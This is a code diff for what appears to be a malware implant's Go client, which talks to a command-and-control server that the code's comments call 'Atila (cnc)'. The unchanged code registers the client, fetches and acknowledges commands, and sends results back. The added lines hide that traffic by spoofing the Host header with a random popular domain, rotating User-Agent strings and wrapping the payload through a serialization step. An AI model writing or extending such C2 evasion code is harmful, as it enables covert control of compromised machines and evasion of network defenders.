@@ -66,8 +66,16 @@ func identify(id string, publicKey *rsa.PublicKey) bool {
 		return false
 	}
 
-	request, err := http.NewRequest("POST", atilaHost+"/v1/clients", bytes.NewBuffer(detailsJson))
+	payloadJson, err := serializedTraffic(string(detailsJson))
+	if err != nil {
+		fmt.Println(err.Error())
+		return false
+	}
+
+	request, err := http.NewRequest("POST", atilaHost+"/v1/clients", bytes.NewBuffer([]byte(payloadJson)))
+	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
 		fmt.Println(err.Error())
 		return false
@@ -128,7 +136,9 @@ func messageAck(messageId string) {
 	}
 
 	request, err := http.NewRequest("POST", atilaHost+"/v1/messages/ack", bytes.NewBuffer(messageAckJson))
+	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
 		fmt.Println("Unable to connect to the centralized host.")
 	}
@@ -151,7 +161,9 @@ func sendMessage(message Message) error {
 	}
 
 	request, err := http.NewRequest("POST", atilaHost+"/v1/messages", bytes.NewBuffer(insertionJson))
+	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
 		return err
 	}
@@ -230,7 +242,15 @@ func interpretMessage(message Message) (Message, error) {
 // fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
 // Do remember to ack. the message after interpreting it and issue the response.
 func fetchMessages(id string) []Message {
-	response, err := http.Get(atilaHost + "/v1/messages?clientId=" + id)
+	request, err := http.NewRequest("GET", atilaHost+"/v1/messages?clientId="+id, nil)
+	request.Host = randomPopularDomain()
+	request.Header.Set("User-Agent", randomUserAgent())
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+
+	client := &http.Client{}
+	response, err := client.Do(request)
 	if err != nil {
 		fmt.Println(err.Error())
 	}
